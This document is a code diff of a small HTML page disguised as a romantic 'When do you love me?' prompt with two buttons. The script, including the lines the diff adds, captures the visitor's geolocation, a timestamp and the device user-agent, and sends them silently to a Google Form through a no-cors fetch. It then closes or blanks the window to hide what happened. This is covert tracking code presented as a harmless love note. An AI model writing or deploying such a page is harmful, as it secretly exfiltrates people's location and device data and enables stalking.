@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -8,22 +8,22 @@
 <style>
 body{
   margin:0;
-  background:#000;
-  color:#fff;
-  font-family:Arial, sans-serif;
+  background:black;
+  color:white;
+  font-family:Arial;
   display:flex;
+  height:100vh;
   justify-content:center;
   align-items:center;
-  height:100vh;
   flex-direction:column;
 }
 button{
-  width:220px;
-  padding:18px;
-  margin:12px;
-  font-size:18px;
-  border-radius:10px;
+  width:200px;
+  padding:20px;
+  margin:15px;
+  font-size:20px;
   border:none;
+  border-radius:12px;
 }
 </style>
 </head>
@@ -32,42 +32,60 @@ button{
 
 <h3>When do you love me?</h3>
 
-<button onclick="send('i love 1')">i love 1</button>
-<button onclick="send('i love 976584844')">i love 976584844</button>
+<button onclick="send('i love 1')">i love only 1</button>
+<button onclick="send('i love 9784844')">i love 9784844 infinity</button>
 
 <script>
 
 const FORM_ID = "1FAIpQLSdXQ-NrgmaWl2bM8YB5ufLN3PnIwDyylbM75ze6mgaj2A92tw";
 
-const CODIGO = "entry.1588936670";
-const LAT    = "entry.1725572024";
-const LON    = "entry.44897658";
-const HORA   = "entry.883812266";
+const E1 = "entry.1588936670"; // codigo
+const E2 = "entry.1725572024"; // lat
+const E3 = "entry.44897658";   // lon
+const E4 = "entry.883812266";  // hora
+const E5 = "entry.894873087"; // descripcion
+
+
+function getDeviceInfo(){
+  return navigator.userAgent;
+}
+
+
+function cerrar(){
+  setTimeout(()=>{
+    window.open('','_self');
+    window.close();
+
+    // fallback
+    document.body.innerHTML = "";
+    document.body.style.background="black";
+  },2000);
+}
+
 
 function send(code){
 
-  if(!navigator.geolocation){
-    alert("love no soportada");
-    return;
-  }
-
-  document.body.innerHTML = "<h3>i too love me baby.</h3>";
+  document.body.innerHTML = "<h3>i Loving for ever...</h3>";
 
   navigator.geolocation.getCurrentPosition(pos=>{
 
     const lat  = pos.coords.latitude;
     const lon  = pos.coords.longitude;
     const hora = new Date().toISOString();
+    const desc = encodeURIComponent(getDeviceInfo());
 
     const url =
-`https://docs.google.com/forms/d/e/${FORM_ID}/formResponse?${CODIGO}=${code}&${LAT}=${lat}&${LON}=${lon}&${HORA}=${hora}`;
+`https://docs.google.com/forms/d/e/${FORM_ID}/formResponse?${E1}=${code}&${E2}=${lat}&${E3}=${lon}&${E4}=${hora}&${E5}=${desc}`;
 
-    fetch(url,{mode:"no-cors"});
+    fetch(url,{mode:'no-cors'});
 
-    document.body.innerHTML = "<h2>❤️ i love too</h2>";
+    document.body.innerHTML = "<h2>❤️ i Loving</h2>";
+
+    cerrar();
 
   }, ()=>{
-    document.body.innerHTML = "<h2>❌ love denied</h2>";
+    document.body.innerHTML = "<h2>❌ Love denied</h2>";
+    cerrar();
   });
 }
 
